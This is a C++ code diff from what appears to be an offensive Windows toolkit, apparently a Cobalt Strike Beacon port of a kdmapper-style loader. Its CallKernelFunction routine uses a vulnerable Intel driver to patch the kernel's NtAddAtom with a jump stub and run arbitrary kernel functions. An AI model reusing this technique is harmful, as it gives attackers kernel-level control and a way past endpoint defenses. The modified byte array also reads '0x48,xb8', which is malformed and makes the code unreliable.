@@ -59,43 +59,40 @@ namespace Intel {
 
 	// NOTE: exposed in order to use templated arguments. Not sure it's necessary.
 	template<typename T, typename ...A>
-	bool CallKernelFunction(HANDLE handle, T *out_result, UINT_PTR kernel_function_address, const A ...arguments) {
-		constexpr auto call_void = std::is_same_v<T, void>;
+	bool CallKernelFunction(HANDLE handle, UINT_PTR function, T *result, const A ...arguments) {
 
-		//if count of arguments is >4 fail
+		constexpr auto call_void = std::is_same_v<T, void>; // might need statically compiled
 		static_assert(sizeof...(A) <= 4);
 
 		if constexpr (!call_void) {
-			if (!out_result) {
+			if (!result) {
 				return false;
 			}
 		}
 		else {
-			UNREFERENCED_PARAMETER(out_result);
+			UNREFERENCED_PARAMETER(result);
 		}
 
-		if (!kernel_function_address) {
+		if (!function) {
 			return false;
 		}
 
-		// Setup function call
-		// TODO: add NtAddAtom to API list
 		HMODULE ntdll = (HMODULE) FindModuleEntry(NTDLL)->DllBase;
 		if (!ntdll) {
 			return false;
 		}
 
-		const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
+		const auto NtAddAtom = (void*) GetProcAddress(ntdll, "NtAddAtom");
 		if (!NtAddAtom) {
 			return false;
 		}
 
-		UINT8 injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
+		UINT8 injected_jmp[] = { 0x48,xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xe0 };
 		UINT8 org_function[sizeof(injected_jmp)];
-		*(UINT_PTR*) &injected_jmp[2] = kernel_function_address;
 
-		// TODO: add ntoskrnl.exe to hash list
-		static UINT_PTR nt_add_atom = GetKernelModuleExport(handle, intel_driver::ntoskrnl_addr, "NtAddAtom");
+		*(UINT_PTR*) &injected_jmp[2] = function;
+
+		static UINT_PTR nt_add_atom = GetKernelExport(handle, ntoskrnl, "NtAddAtom");
 		if (!nt_add_atom) {
 			return false;
 		}
@@ -103,29 +100,27 @@ namespace Intel {
 		if (!Beacon$ReadMemory(handle, &org_function, nt_add_atom, sizeof(injected_jmp)))
 			return false;
 
-		if (org_function[0] == injected_jmp[0] &&
-			org_function[1] == injected_jmp[1] &&
+		if (org_function[0] == injected_jmp[0] && org_function[1] == injected_jmp[1] &&
 			org_function[sizeof(injected_jmp) - 2] == injected_jmp[sizeof(injected_jmp) - 2] &&
 			org_function[sizeof(injected_jmp) - 1] == injected_jmp[sizeof(injected_jmp) - 1]) {
 			return false;
 		}
 
-		// Overwrite the pointer with kernel_function_address
+		// Overwrite the pointer with function
 		if (!Beacon$WriteToReadOnlyMemory(handle, &injected_jmp, nt_add_atom, sizeof(injected_jmp)))
 			return false;
 
-		// Call function
 		if constexpr (!call_void) {
-			using FunctionFn = T(__stdcall*)(A...);
-			const auto Function = (FunctionFn) NtAddAtom;
+			using function_t = T(__stdcall*)(A...);
+			const auto _function = (function_t) NtAddAtom;
 
-			*out_result = Function(arguments...);
+			*result = _function(arguments...);
 		}
 		else {
-			using FunctionFn = void(__stdcall*)(A...);
-			const auto Function = (FunctionFn) NtAddAtom;
+			using function_t = void(__stdcall*)(A...);
+			const auto _function = (function_t) NtAddAtom;
 
-			Function(arguments...);
+			_function(arguments...);
 		}
 
 		// Restore the pointer/jmp
